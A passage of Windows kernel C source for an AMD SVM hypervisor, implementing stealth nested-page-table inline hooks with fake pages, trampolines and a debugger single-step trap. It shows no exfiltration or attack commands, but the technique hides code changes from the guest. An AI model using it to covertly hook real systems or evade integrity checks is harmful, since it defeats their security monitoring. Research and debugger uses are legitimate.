            if (!entry && state == NPT_DEBUG_STEP_FREE) entry = candidate;
        }
        if (!entry) return STATUS_INSUFFICIENT_RESOURCES;

        processorCount = g_HypervisorContext.ProcessorCount;
        RtlZeroMemory(entry, sizeof(*entry));
        for (ULONG cpu = 0; cpu < processorCount; cpu++) {
            PVCPU_DATA vcpu = &g_HypervisorContext.VcpuData[cpu];
            PNPT_PTE pte = NptGetOrCreatePteForHook(
                vcpu,
                (ULONG64)hpa.QuadPart);
            if (!pte) {
                RtlZeroMemory(entry, sizeof(*entry));
                return STATUS_NOT_SUPPORTED;
            }
            NPT_PTE observed;
            observed.Value = (ULONG64)InterlockedCompareExchange64(
                (volatile LONG64*)&pte->Value,
                0,
                0);
            if (!observed.Present || observed.NoExecute) {
                RtlZeroMemory(entry, sizeof(*entry));
                return STATUS_CONFLICTING_ADDRESSES;
            }
            entry->TargetPte[cpu] = pte;
            entry->OriginalPteValue[cpu] = observed.Value;
        }

        InterlockedIncrement(&entry->Sequence);
        entry->DebuggerPid = DebuggerPid;
        entry->TargetPid = TargetPid;
        entry->TargetTid = TargetTid;
        entry->ThreadToken = ThreadToken;
        entry->UserCr3 = userCr3 & ~0xFFFULL;
        entry->Address = Address;
        entry->GpaPage = (ULONG64)hpa.QuadPart & PAGE_MASK;
        entry->PteCount = processorCount;
        KeMemoryBarrier();
        InterlockedExchange(&entry->State, NPT_DEBUG_STEP_ARMED);
        KeMemoryBarrier();
        InterlockedIncrement(&entry->Sequence);

        for (ULONG cpu = 0; cpu < processorCount; cpu++) {
            NPT_PTE trap;
            trap.Value = entry->OriginalPteValue[cpu];
            trap.NoExecute = 1;
            InterlockedExchange64(
                (volatile LONG64*)&entry->TargetPte[cpu]->Value,
                (LONG64)trap.Value);
        }
        InterlockedIncrement64((volatile LONG64*)&g_NptVersion);
        status = HvBroadcastVmCallToAllCpus(VMCALL_REFRESH_NPT_STATE);
        if (!NT_SUCCESS(status)) {
            for (ULONG cpu = 0; cpu < processorCount; cpu++) {
                InterlockedExchange64(
                    (volatile LONG64*)&entry->TargetPte[cpu]->Value,
                    (LONG64)entry->OriginalPteValue[cpu]);
            }
            InterlockedIncrement64((volatile LONG64*)&g_NptVersion);
            RtlZeroMemory(entry, sizeof(*entry));
            return status;
        }
        return STATUS_SUCCESS;
    }
    __finally {
        ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    }
}

NTSTATUS NptHookDebugStepClear(
    _In_ HANDLE DebuggerPid,
    _In_ HANDLE TargetPid,
    _In_ HANDLE TargetTid)
{
    NTSTATUS status = STATUS_NOT_FOUND;

    if (!g_NptHookManager.Initialized) return STATUS_DEVICE_NOT_READY;
    if (!DebuggerPid || !TargetPid || !TargetTid) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() != PASSIVE_LEVEL) return STATUS_INVALID_LEVEL;

    ExAcquireFastMutex(&g_NptHookManager.MutationMutex);
    __try {
        for (ULONG index = 0; index < NPT_DEBUG_STEP_MAX; index++) {
            PNPT_DEBUG_STEP_ENTRY entry = &g_NptDebugSteps[index];
            LONG state = InterlockedCompareExchange(
                &entry->State,
                NPT_DEBUG_STEP_FREE,
                NPT_DEBUG_STEP_FREE);
            if (state == NPT_DEBUG_STEP_FREE ||
                entry->DebuggerPid != DebuggerPid ||
                entry->TargetPid != TargetPid ||
                entry->TargetTid != TargetTid) {
                continue;
            }
            if (state == NPT_DEBUG_STEP_COMPLETING) {
                return STATUS_DEVICE_BUSY;
            }
            InterlockedIncrement(&entry->Sequence);
            for (ULONG cpu = 0; cpu < entry->PteCount; cpu++) {
                if (entry->TargetPte[cpu]) {
                    InterlockedExchange64(
                        (volatile LONG64*)&entry->TargetPte[cpu]->Value,
                        (LONG64)entry->OriginalPteValue[cpu]);
                }
            }
            KeMemoryBarrier();
            InterlockedExchange(&entry->State, NPT_DEBUG_STEP_FREE);
            KeMemoryBarrier();
            RtlZeroMemory(entry, sizeof(*entry));
            InterlockedIncrement64((volatile LONG64*)&g_NptVersion);
            (void)HvBroadcastVmCallToAllCpus(VMCALL_REFRESH_NPT_STATE);
            status = STATUS_SUCCESS;
            break;
        }
        return status;
    }
    __finally {
        ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    }
}

VOID NptHookDebugStepClearAll(
    _In_opt_ HANDLE DebuggerPid,
    _In_opt_ HANDLE TargetPid)
{
    BOOLEAN changed = FALSE;

    if (!g_NptHookManager.Initialized ||
        KeGetCurrentIrql() != PASSIVE_LEVEL) {
        return;
    }

    ExAcquireFastMutex(&g_NptHookManager.MutationMutex);
    __try {
        for (ULONG index = 0; index < NPT_DEBUG_STEP_MAX; index++) {
            PNPT_DEBUG_STEP_ENTRY entry = &g_NptDebugSteps[index];
            LONG state = InterlockedCompareExchange(
                &entry->State,
                NPT_DEBUG_STEP_FREE,
                NPT_DEBUG_STEP_FREE);
            if (state == NPT_DEBUG_STEP_FREE ||
                (DebuggerPid && entry->DebuggerPid != DebuggerPid) ||
                (TargetPid && entry->TargetPid != TargetPid)) {
                continue;
            }
            for (ULONG retry = 0;
                 state == NPT_DEBUG_STEP_COMPLETING && retry < 10000;
                 retry++) {
                KeStallExecutionProcessor(1);
                state = InterlockedCompareExchange(
                    &entry->State,
                    NPT_DEBUG_STEP_FREE,
                    NPT_DEBUG_STEP_FREE);
            }
            if (state == NPT_DEBUG_STEP_COMPLETING) continue;

            InterlockedIncrement(&entry->Sequence);
            for (ULONG cpu = 0; cpu < entry->PteCount; cpu++) {
                if (entry->TargetPte[cpu]) {
                    InterlockedExchange64(
                        (volatile LONG64*)&entry->TargetPte[cpu]->Value,
                        (LONG64)entry->OriginalPteValue[cpu]);
                }
            }
            KeMemoryBarrier();
            InterlockedExchange(&entry->State, NPT_DEBUG_STEP_FREE);
            KeMemoryBarrier();
            RtlZeroMemory(entry, sizeof(*entry));
            changed = TRUE;
        }
        if (changed) {
            InterlockedIncrement64((volatile LONG64*)&g_NptVersion);
            (void)HvBroadcastVmCallToAllCpus(VMCALL_REFRESH_NPT_STATE);
        }
    }
    __finally {
        ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    }
}

BOOLEAN NptHookHandleDebugStepNpf(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 GuestPhysicalAddress,
    _In_ ULONG64 ErrorCode)
{
    PNPT_DEBUG_STEP_ENTRY match = NULL;
    BOOLEAN deliver = FALSE;
    ULONG cpu;
    UINT64 guestCr3;
    PVOID threadToken;

    if (!VcpuData || !VcpuData->Vmcb ||
        !(ErrorCode & NPF_FETCH) || VcpuData->ProcessorNumber >= 64) {
        return FALSE;
    }
    cpu = VcpuData->ProcessorNumber;
    guestCr3 = VcpuData->Vmcb->StateSaveArea.Cr3 & ~0xFFFULL;
    threadToken = NptHookpCurrentThreadToken();

    for (ULONG index = 0; index < NPT_DEBUG_STEP_MAX; index++) {
        PNPT_DEBUG_STEP_ENTRY entry = &g_NptDebugSteps[index];
        LONG before = InterlockedCompareExchange(&entry->Sequence, 0, 0);
        if (before & 1) continue;
        LONG state = InterlockedCompareExchange(
            &entry->State,
            NPT_DEBUG_STEP_FREE,
            NPT_DEBUG_STEP_FREE);
        ULONG64 gpaPage = entry->GpaPage;
        UINT64 entryCr3 = entry->UserCr3;
        PVOID entryThread = entry->ThreadToken;
        KeMemoryBarrier();
        if (before != InterlockedCompareExchange(&entry->Sequence, 0, 0) ||
            state != NPT_DEBUG_STEP_ARMED ||
            gpaPage != (GuestPhysicalAddress & PAGE_MASK)) {
            continue;
        }
        match = entry;
        deliver = entryCr3 == guestCr3 && entryThread == threadToken;
        break;
    }
    if (!match || !match->TargetPte[cpu]) return FALSE;

    PNPT_DEBUG_STEP_CPU stepCpu = &g_NptDebugStepCpu[cpu];
    if (InterlockedCompareExchange(&stepCpu->Active, 1, 0) != 0) {
        return FALSE;
    }
    if (deliver && InterlockedCompareExchange(
            &match->State,
            NPT_DEBUG_STEP_COMPLETING,
            NPT_DEBUG_STEP_ARMED) != NPT_DEBUG_STEP_ARMED) {
        InterlockedExchange(&stepCpu->Active, 0);
        return FALSE;
    }

    NPT_PTE trap;
    trap.Value = match->OriginalPteValue[cpu];
    trap.NoExecute = 1;
    stepCpu->Deliver = deliver;
    stepCpu->GuestTfWasSet =
        (VcpuData->Vmcb->StateSaveArea.Rflags & 0x100ULL) != 0;
    stepCpu->DbInterceptWasSet =
        (VcpuData->Vmcb->ControlArea.InterceptExceptions & (1ULL << 1)) != 0;
    stepCpu->TargetPte = match->TargetPte[cpu];
    stepCpu->TrapPteValue = trap.Value;
    stepCpu->Entry = deliver ? match : NULL;
    KeMemoryBarrier();

    InterlockedExchange64(
        (volatile LONG64*)&match->TargetPte[cpu]->Value,
        (LONG64)match->OriginalPteValue[cpu]);
    VcpuData->Vmcb->StateSaveArea.Rflags |= 0x100ULL;
    VcpuData->Vmcb->ControlArea.InterceptExceptions |= (1ULL << 1);
    VcpuData->Vmcb->ControlArea.TlbControl = SVM_TLB_CONTROL_FLUSH_GUEST;
    return TRUE;
}

ULONG NptHookHandleDebugStepDb(
    _In_ PVCPU_DATA VcpuData)
{
    ULONG cpu;
    PNPT_DEBUG_STEP_CPU stepCpu;
    BOOLEAN reinject;

    if (!VcpuData || !VcpuData->Vmcb || VcpuData->ProcessorNumber >= 64) {
        return NPT_DEBUG_STEP_DB_NONE;
    }
    cpu = VcpuData->ProcessorNumber;
    stepCpu = &g_NptDebugStepCpu[cpu];
    if (InterlockedCompareExchange(&stepCpu->Active, 2, 1) != 1) {
        return NPT_DEBUG_STEP_DB_NONE;
    }
    KeMemoryBarrier();

    if (stepCpu->TargetPte) {
        InterlockedExchange64(
            (volatile LONG64*)&stepCpu->TargetPte->Value,
            (LONG64)stepCpu->TrapPteValue);
    }
    if (stepCpu->GuestTfWasSet) {
        VcpuData->Vmcb->StateSaveArea.Rflags |= 0x100ULL;
    } else {
        VcpuData->Vmcb->StateSaveArea.Rflags &= ~0x100ULL;
    }
    if (stepCpu->DbInterceptWasSet) {
        VcpuData->Vmcb->ControlArea.InterceptExceptions |= (1ULL << 1);
    } else {
        VcpuData->Vmcb->ControlArea.InterceptExceptions &= ~(1ULL << 1);
    }
    VcpuData->Vmcb->ControlArea.TlbControl = SVM_TLB_CONTROL_FLUSH_GUEST;

    reinject = stepCpu->Deliver || stepCpu->GuestTfWasSet ||
        ((VcpuData->Vmcb->StateSaveArea.Dr6 & 0xB00FULL) != 0);
    if (stepCpu->Deliver && stepCpu->Entry) {
        (void)InterlockedCompareExchange(
            &stepCpu->Entry->State,
            NPT_DEBUG_STEP_COMPLETED,
            NPT_DEBUG_STEP_COMPLETING);
    }
    if (!reinject) {
        VcpuData->Vmcb->StateSaveArea.Dr6 &= ~(1ULL << 14);
    }

    stepCpu->Deliver = FALSE;
    stepCpu->GuestTfWasSet = FALSE;
    stepCpu->DbInterceptWasSet = FALSE;
    stepCpu->TargetPte = NULL;
    stepCpu->TrapPteValue = 0;
    stepCpu->Entry = NULL;
    KeMemoryBarrier();
    InterlockedExchange(&stepCpu->Active, 0);
    return reinject
        ? NPT_DEBUG_STEP_DB_REINJECT
        : NPT_DEBUG_STEP_DB_CONSUME;
}

// ============================================================
// Hook 安装
// ============================================================

static BOOLEAN
NptHookpPatchRangesOverlap(
    _In_ ULONG LeftOffset,
    _In_ ULONG LeftLength,
    _In_ ULONG RightOffset,
    _In_ ULONG RightLength)
{
    return LeftOffset < RightOffset + RightLength &&
           RightOffset < LeftOffset + LeftLength;
}

static PNPT_HOOK_PAGE
NptHookpFindPageByTargetGpaLocked(
    _In_ ULONG64 TargetPhysicalAddress)
{
    PLIST_ENTRY link;

    for (link = g_NptHookManager.PageList.Flink;
         link != &g_NptHookManager.PageList;
         link = link->Flink) {
        PNPT_HOOK_PAGE page = CONTAINING_RECORD(
            link, NPT_HOOK_PAGE, ListEntry);
        if (page->TargetPhysicalAddress ==
            (TargetPhysicalAddress & PAGE_MASK)) {
            return page;
        }
    }
    return NULL;
}

static VOID
NptHookpRebuildCompositePage(
    _Inout_ PNPT_HOOK_PAGE PageOwner,
    _In_opt_ PNPT_HOOK_ENTRY IncludePrepared,
    _In_opt_ PNPT_HOOK_ENTRY ExcludeActive)
{
    PLIST_ENTRY link;

    RtlCopyMemory(
        PageOwner->FakePageVirtual,
        PageOwner->TargetPageVirtualAddress,
        PAGE_SIZE_4KB);

    for (link = PageOwner->SiteList.Flink;
         link != &PageOwner->SiteList;
         link = link->Flink) {
        PNPT_HOOK_ENTRY site = CONTAINING_RECORD(
            link, NPT_HOOK_ENTRY, PageListEntry);

        site->PatchInstalled = FALSE;
        if (site == ExcludeActive ||
            site->State != NptHookStateActive) {
            continue;
        }
        RtlCopyMemory(
            (PUCHAR)PageOwner->FakePageVirtual + site->OffsetInPage,
            site->PatchBytes,
            NPT_JMP_SIZE);
        site->PatchInstalled = TRUE;
    }

    if (IncludePrepared && IncludePrepared != ExcludeActive) {
        RtlCopyMemory(
            (PUCHAR)PageOwner->FakePageVirtual +
                IncludePrepared->OffsetInPage,
            IncludePrepared->PatchBytes,
            NPT_JMP_SIZE);
        IncludePrepared->PatchInstalled = TRUE;
    }
    MemoryBarrier();
}

static NTSTATUS
NptHookpSetupPageLeaves(
    _Inout_ PNPT_HOOK_PAGE PageOwner)
{
    ULONG processorCount = g_HypervisorContext.ProcessorCount;
    ULONG i;

    if (processorCount == 0 ||
        processorCount > RTL_NUMBER_OF(PageOwner->TargetPte)) {
        return STATUS_DEVICE_NOT_READY;
    }

    PageOwner->TargetPteCount = 0;
    RtlZeroMemory(PageOwner->TargetPte, sizeof(PageOwner->TargetPte));
    RtlZeroMemory(
        PageOwner->OriginalPteValue,
        sizeof(PageOwner->OriginalPteValue));

    for (i = 0; i < processorCount; ++i) {
        PVCPU_DATA cpuVcpu = &g_HypervisorContext.VcpuData[i];

        if (!cpuVcpu->IsVirtualized || !cpuVcpu->NptTables) {
            goto NotReady;
        }
        PageOwner->TargetPte[i] = NptGetOrCreatePteForHook(
            cpuVcpu, PageOwner->TargetPhysicalAddress);
        if (!PageOwner->TargetPte[i]) {
            goto NotReady;
        }
    }

    for (i = 0; i < processorCount; ++i) {
        NPT_PTE observed;
        ULONG previous;

        for (previous = 0; previous < i; ++previous) {
            if (PageOwner->TargetPte[previous] ==
                PageOwner->TargetPte[i]) {
                DbgPrint("[NPT-Hook] Activation rejected shared leaf for CPUs %u/%u\n",
                         previous, i);
                goto Conflict;
            }
        }

        observed.Value = (ULONG64)InterlockedCompareExchange64(
            (volatile LONG64*)&PageOwner->TargetPte[i]->Value, 0, 0);
        if (!observed.Present || observed.NoExecute ||
            observed.PageFrameNumber !=
                (PageOwner->TargetPhysicalAddress >> PAGE_SHIFT)) {
            DbgPrint("[NPT-Hook] Activation preflight failed on CPU %u: leaf=0x%llx expected PFN=0x%llx\n",
                     i,
                     observed.Value,
                     PageOwner->TargetPhysicalAddress >> PAGE_SHIFT);
            goto Conflict;
        }
        PageOwner->OriginalPteValue[i] = observed.Value;
    }

    PageOwner->TargetPteCount = processorCount;
    return STATUS_SUCCESS;

Conflict:
    RtlZeroMemory(PageOwner->TargetPte, sizeof(PageOwner->TargetPte));
    RtlZeroMemory(
        PageOwner->OriginalPteValue,
        sizeof(PageOwner->OriginalPteValue));
    return STATUS_CONFLICTING_ADDRESSES;

NotReady:
    RtlZeroMemory(PageOwner->TargetPte, sizeof(PageOwner->TargetPte));
    RtlZeroMemory(
        PageOwner->OriginalPteValue,
        sizeof(PageOwner->OriginalPteValue));
    return STATUS_DEVICE_NOT_READY;
}

static VOID
NptHookpPublishSteadyLeaves(
    _In_ PNPT_HOOK_PAGE PageOwner)
{
    ULONG i;

    for (i = 0;
         i < PageOwner->TargetPteCount &&
         i < RTL_NUMBER_OF(PageOwner->TargetPte);
         ++i) {
        NptHookpUpdatePteAtomic(
            PageOwner->TargetPte[i],
            TRUE,
            PageOwner->TargetPhysicalAddress >> PAGE_SHIFT,
            TRUE,
            TRUE,
            TRUE);
    }
    NptHookpSynchronizePageTlb(PageOwner);
}

static BOOLEAN
NptHookpStepReferencesPage(
    _In_ PNPT_STEP_CONTEXT StepContext,
    _In_ PNPT_HOOK_PAGE PageOwner)
{
    ULONG i;

    if (!StepContext || !PageOwner) {
        return FALSE;
    }
    for (i = 0;
         i < StepContext->PendingPageCount &&
         i < RTL_NUMBER_OF(StepContext->PendingPages);
         ++i) {
        if (StepContext->PendingPages[i] == PageOwner) {
            return TRUE;
        }
    }
    return FALSE;
}

static NTSTATUS
NptHookpQuiescePage(
    _Inout_ PNPT_HOOK_PAGE PageOwner,
    _In_ PNPT_HOOK_ENTRY MutationSite,
    _In_ NPT_HOOK_PAGE_MUTATION MutationKind)
{
    ULONG oldEpoch;
    ULONG retryCount;
    ULONG i;

    if (PageOwner->State == NptHookStateActive) {
        if (PageOwner->MutationSite != NULL ||
            PageOwner->MutationKind != NptHookPageMutationNone) {
            return STATUS_DEVICE_BUSY;
        }
        PageOwner->MutationSite = MutationSite;
        PageOwner->MutationKind = MutationKind;
        MemoryBarrier();
        InterlockedExchange(
            (volatile LONG*)&PageOwner->State,
            (LONG)NptHookStateQuiescing);

        oldEpoch = NptHookpAdvanceRootEpoch();
        PageOwner->RootDrainEpoch = oldEpoch;
        MemoryBarrier();
        InterlockedExchange(&PageOwner->RootDrainPending, 1);
    } else if (PageOwner->State == NptHookStateQuiescing) {
        if (PageOwner->MutationSite != MutationSite ||
            PageOwner->MutationKind != MutationKind) {
            return STATUS_DEVICE_BUSY;
        }
    } else {
        return STATUS_INVALID_DEVICE_STATE;
    }

    if (InterlockedCompareExchange(
            &PageOwner->RootDrainPending, 0, 0) != 0) {
        if (!NptHookpWaitRootEpoch(PageOwner->RootDrainEpoch)) {
            return STATUS_DEVICE_BUSY;
        }
        InterlockedExchange(&PageOwner->RootDrainPending, 0);
    }

    if (NptHookpRestoreOriginalLeaves(PageOwner) > 0) {
        NptHookpSynchronizePageTlb(PageOwner);
    }

    retryCount = 0;
    while (retryCount < 100) {
        BOOLEAN anyPending = FALSE;

        for (i = 0; i < RTL_NUMBER_OF(g_NptHookManager.StepContext); ++i) {
            PNPT_STEP_CONTEXT stepCtx = &g_NptHookManager.StepContext[i];
            if (InterlockedCompareExchange(&stepCtx->StepActive, 0, 0) != 0) {
                MemoryBarrier();
                if (NptHookpStepReferencesPage(stepCtx, PageOwner)) {
                    anyPending = TRUE;
                    break;
                }
            }
        }
        if (!anyPending) {
            break;
        }

        {
            LARGE_INTEGER delay;
            delay.QuadPart = -10000;
            KeDelayExecutionThread(KernelMode, FALSE, &delay);
        }
        ++retryCount;
    }

    if (retryCount >= 100) {
        return STATUS_DEVICE_BUSY;
    }
    if (NptHookpRestoreOriginalLeaves(PageOwner) > 0) {
        NptHookpSynchronizePageTlb(PageOwner);
    }
    return STATUS_SUCCESS;
}

NTSTATUS
NptHookPrepare(
    _In_ PVOID TargetAddress,
    _In_ PVOID HookFunction,
    _Out_ PNPT_HOOK_ENTRY* OutHookEntry,
    _Out_ PVOID* OutTrampoline
)
{
    NTSTATUS status;
    PNPT_HOOK_ENTRY hookEntry = NULL;
    PNPT_HOOK_PAGE pageOwner = NULL;
    BOOLEAN newPageOwner = FALSE;
    PHYSICAL_ADDRESS targetPa;
    KIRQL oldIrql;

    if (!OutHookEntry || !OutTrampoline ||
        !TargetAddress || !HookFunction) {
        return STATUS_INVALID_PARAMETER;
    }
    *OutHookEntry = NULL;
    *OutTrampoline = NULL;

    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (!g_NptHookManager.Initialized) {
        return STATUS_NOT_INITIALIZED;
    }

    ExAcquireFastMutex(&g_NptHookManager.MutationMutex);
    __try {
        PLIST_ENTRY link;

        if (!g_NptHookManager.Initialized) {
            return STATUS_NOT_INITIALIZED;
        }
        if (!g_HypervisorContext.IsActive ||
            !g_HypervisorContext.VcpuData) {
            return STATUS_DEVICE_NOT_READY;
        }
        if (g_NptHookManager.HookCount >= MAX_NPT_HOOKS) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        targetPa = MmGetPhysicalAddress(TargetAddress);
        if (targetPa.QuadPart == 0) {
            return STATUS_INVALID_ADDRESS;
        }
        if ((targetPa.QuadPart & (PAGE_SIZE_4KB - 1)) >
            PAGE_SIZE_4KB - NPT_JMP_SIZE) {
            DbgPrint("[NPT-Hook] Refusing cross-page inline patch at %p\n",
                     TargetAddress);
            return STATUS_CONFLICTING_ADDRESSES;
        }

        for (link = g_NptHookManager.HookList.Flink;
             link != &g_NptHookManager.HookList;
             link = link->Flink) {
            PNPT_HOOK_ENTRY existing = CONTAINING_RECORD(
                link, NPT_HOOK_ENTRY, ListEntry);
            if (existing->TargetVirtualAddress == TargetAddress) {
                return STATUS_ALREADY_REGISTERED;
            }
        }

        hookEntry = (PNPT_HOOK_ENTRY)HvAllocateNonPagedZeroed(
            sizeof(NPT_HOOK_ENTRY), NPT_HOOK_TAG);
        if (!hookEntry) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        hookEntry->TargetVirtualAddress = TargetAddress;
        hookEntry->TargetPhysicalAddress =
            targetPa.QuadPart & PAGE_MASK;
        hookEntry->OffsetInPage =
            (ULONG)(targetPa.QuadPart & (PAGE_SIZE_4KB - 1));
        hookEntry->HookFunction = HookFunction;
        hookEntry->Type = NptHookTypeInline;
        hookEntry->State = NptHookStatePrepared;

        pageOwner = NptHookpFindPageByTargetGpaLocked(
            hookEntry->TargetPhysicalAddress);
        if (pageOwner) {
            if (pageOwner->State == NptHookStateQuiescing ||
                pageOwner->MutationKind != NptHookPageMutationNone) {
                ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
                return STATUS_DEVICE_BUSY;
            }
            for (link = pageOwner->SiteList.Flink;
                 link != &pageOwner->SiteList;
                 link = link->Flink) {
                PNPT_HOOK_ENTRY existing = CONTAINING_RECORD(
                    link, NPT_HOOK_ENTRY, PageListEntry);
                if (NptHookpPatchRangesOverlap(
                        existing->OffsetInPage,
                        NPT_JMP_SIZE,
                        hookEntry->OffsetInPage,
                        NPT_JMP_SIZE)) {
                    DbgPrint("[NPT-Hook] Overlapping same-page patch rejected: %p / %p\n",
                             existing->TargetVirtualAddress,
                             TargetAddress);
                    ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
                    return STATUS_CONFLICTING_ADDRESSES;
                }
            }
        } else {
            pageOwner = (PNPT_HOOK_PAGE)HvAllocateNonPagedZeroed(
                sizeof(NPT_HOOK_PAGE), NPT_HOOK_PAGE_TAG);
            if (!pageOwner) {
                ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            InitializeListHead(&pageOwner->SiteList);
            pageOwner->State = NptHookStatePrepared;
            pageOwner->MutationKind = NptHookPageMutationNone;
            pageOwner->TargetPhysicalAddress =
                hookEntry->TargetPhysicalAddress;
            pageOwner->TargetPageVirtualAddress = (PVOID)(
                (ULONG_PTR)TargetAddress & PAGE_MASK);
            status = NptCreateFakePage(pageOwner, TargetAddress);
            if (!NT_SUCCESS(status)) {
                ExFreePoolWithTag(pageOwner, NPT_HOOK_PAGE_TAG);
                ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
                return status;
            }
            newPageOwner = TRUE;
        }

#if NPT_HOOK_SIMPLE_MODE
        RtlCopyMemory(
            hookEntry->OriginalBytes, TargetAddress, NPT_JMP_SIZE);
        hookEntry->OriginalBytesLength = NPT_JMP_SIZE;
#else
        {
            ULONG bytesToCopy = NptCalculateTrampolineSize(
                (PUCHAR)TargetAddress, NPT_JMP_SIZE);
            if (bytesToCopy < NPT_JMP_SIZE ||
                bytesToCopy > sizeof(hookEntry->OriginalBytes) ||
                hookEntry->OffsetInPage + bytesToCopy > PAGE_SIZE_4KB) {
                if (newPageOwner) {
                    MmFreeContiguousMemory(pageOwner->FakePageVirtual);
                    ExFreePoolWithTag(pageOwner, NPT_HOOK_PAGE_TAG);
                }
                ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
                return STATUS_INVALID_PARAMETER;
            }
            RtlCopyMemory(
                hookEntry->OriginalBytes, TargetAddress, bytesToCopy);
            hookEntry->OriginalBytesLength = bytesToCopy;
        }
#endif

        /* The 14-byte patches must not overlap, and neither may a site's
         * decoded trampoline source window consume a sibling entry point.
         * Calling one site's original trampoline would otherwise silently
         * jump past the sibling hook. */
        if (!newPageOwner) {
            for (link = pageOwner->SiteList.Flink;
                 link != &pageOwner->SiteList;
                 link = link->Flink) {
                PNPT_HOOK_ENTRY existing = CONTAINING_RECORD(
                    link, NPT_HOOK_ENTRY, PageListEntry);
                ULONG existingLength = existing->OriginalBytesLength >
                    NPT_JMP_SIZE
                    ? existing->OriginalBytesLength : NPT_JMP_SIZE;
                ULONG newLength = hookEntry->OriginalBytesLength >
                    NPT_JMP_SIZE
                    ? hookEntry->OriginalBytesLength : NPT_JMP_SIZE;

                if (NptHookpPatchRangesOverlap(
                        existing->OffsetInPage,
                        existingLength,
                        hookEntry->OffsetInPage,
                        newLength)) {
                    ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
                    return STATUS_CONFLICTING_ADDRESSES;
                }
            }
        }

        RtlCopyMemory(hookEntry->PatchBytes, NptJmpTemplate, 6);
        *(PVOID*)(hookEntry->PatchBytes + 6) = HookFunction;

        status = NptCreateTrampoline(hookEntry);
        if (!NT_SUCCESS(status)) {
            if (newPageOwner) {
                MmFreeContiguousMemory(pageOwner->FakePageVirtual);
                ExFreePoolWithTag(pageOwner, NPT_HOOK_PAGE_TAG);
            }
            ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
            return status;
        }

        hookEntry->PageOwner = pageOwner;
        KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
        if (newPageOwner) {
            InsertTailList(
                &g_NptHookManager.PageList, &pageOwner->ListEntry);
            ++g_NptHookManager.PageCount;
        }
        InsertTailList(
            &pageOwner->SiteList, &hookEntry->PageListEntry);
        ++pageOwner->SiteCount;
        InsertTailList(
            &g_NptHookManager.HookList, &hookEntry->ListEntry);
        ++g_NptHookManager.HookCount;
        KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);

        MemoryBarrier();
        *OutTrampoline = hookEntry->TrampolineAddress;
        *OutHookEntry = hookEntry;

        DbgPrint("[NPT-Hook] Site prepared: VA=%p GPA=0x%llx owner=%p sites=%lu\n",
                 TargetAddress,
                 hookEntry->TargetPhysicalAddress,
                 pageOwner,
                 pageOwner->SiteCount);
        return STATUS_SUCCESS;
    }
    __finally {
        ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    }
}

NTSTATUS
NptHookActivate(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    PNPT_HOOK_PAGE pageOwner;
    NTSTATUS status;

    if (!HookEntry) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (!g_NptHookManager.Initialized) {
        return STATUS_NOT_INITIALIZED;
    }

    ExAcquireFastMutex(&g_NptHookManager.MutationMutex);
    __try {
        if (!g_NptHookManager.Initialized) {
            return STATUS_NOT_INITIALIZED;
        }
        if (InterlockedCompareExchange(&HookEntry->Removing, 0, 0) != 0) {
            return STATUS_DEVICE_BUSY;
        }
        if (HookEntry->State == NptHookStateActive) {
            return STATUS_SUCCESS;
        }
        if (HookEntry->State != NptHookStatePrepared) {
            return STATUS_INVALID_DEVICE_STATE;
        }
        pageOwner = HookEntry->PageOwner;
        if (!g_HypervisorContext.IsActive ||
            !g_HypervisorContext.VcpuData ||
            !pageOwner ||
            !pageOwner->FakePagePhysical ||
            !HookEntry->TrampolineAddress) {
            return STATUS_DEVICE_NOT_READY;
        }

        if (pageOwner->State == NptHookStatePrepared) {
            status = NptHookpSetupPageLeaves(pageOwner);
            if (!NT_SUCCESS(status)) {
                return status;
            }
        } else if (pageOwner->State == NptHookStateActive ||
                   pageOwner->State == NptHookStateQuiescing) {
            status = NptHookpQuiescePage(
                pageOwner,
                HookEntry,
                NptHookPageMutationActivate);
            if (!NT_SUCCESS(status)) {
                /* No bytes were changed yet.  A timed-out extra-site
                 * activation must not strand already-active siblings behind
                 * this prepared handle: restore the old composite and leave
                 * the site Prepared so Activate or Remove can be retried. */
                if (pageOwner->State == NptHookStateQuiescing &&
                    pageOwner->MutationSite == HookEntry &&
                    pageOwner->MutationKind ==
                        NptHookPageMutationActivate &&
                    InterlockedCompareExchange(
                        &pageOwner->RootDrainPending, 0, 0) == 0) {
                    pageOwner->MutationSite = NULL;
                    pageOwner->MutationKind =
                        NptHookPageMutationNone;
                    InterlockedExchange(
                        (volatile LONG*)&pageOwner->State,
                        (LONG)NptHookStateActive);
                    NptHookpPublishSteadyLeaves(pageOwner);
                }
                return status;
            }
        } else {
            return STATUS_INVALID_DEVICE_STATE;
        }

        NptHookpRebuildCompositePage(pageOwner, HookEntry, NULL);
        ++pageOwner->ActiveSiteCount;
        if (!pageOwner->AccountingSite) {
            pageOwner->AccountingSite = HookEntry;
        }
        MemoryBarrier();
        InterlockedExchange(
            (volatile LONG*)&HookEntry->State,
            (LONG)NptHookStateActive);
        MemoryBarrier();
        pageOwner->MutationSite = NULL;
        pageOwner->MutationKind = NptHookPageMutationNone;
        InterlockedExchange(
            (volatile LONG*)&pageOwner->State,
            (LONG)NptHookStateActive);
        NptHookpPublishSteadyLeaves(pageOwner);
        DbgPrint("[NPT-Hook] Site activated: %p (owner=%p active=%lu)\n",
                 HookEntry->TargetVirtualAddress,
                 pageOwner,
                 pageOwner->ActiveSiteCount);
        return STATUS_SUCCESS;
    }
